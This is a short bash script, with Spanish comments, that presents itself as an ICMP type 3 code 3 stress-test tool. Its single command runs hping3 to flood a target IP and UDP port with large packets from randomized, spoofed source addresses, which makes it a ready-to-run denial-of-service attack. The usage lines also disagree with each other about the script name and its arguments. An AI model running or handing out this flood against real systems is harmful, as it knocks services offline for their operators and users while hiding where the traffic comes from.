# !/bin/bash
# Herramienta de test de stress ICMP type 3 code 3 a partir de paquetes UDP elaborados con Hping3
# (C) hackingyseguridad.com 2021
# Uso: sh blackstorm.sh ip_target puerto_target ip_spoof
echo
echo UDP Flood con herramienta hping3
echo "Uso: ./udpflood.sh IP Puerto_UDP"
echo "Control + C para interrumpir"
echo 
hping3 $1 -2 --rand-source -p $2 --flood -d 1440 $3 $4
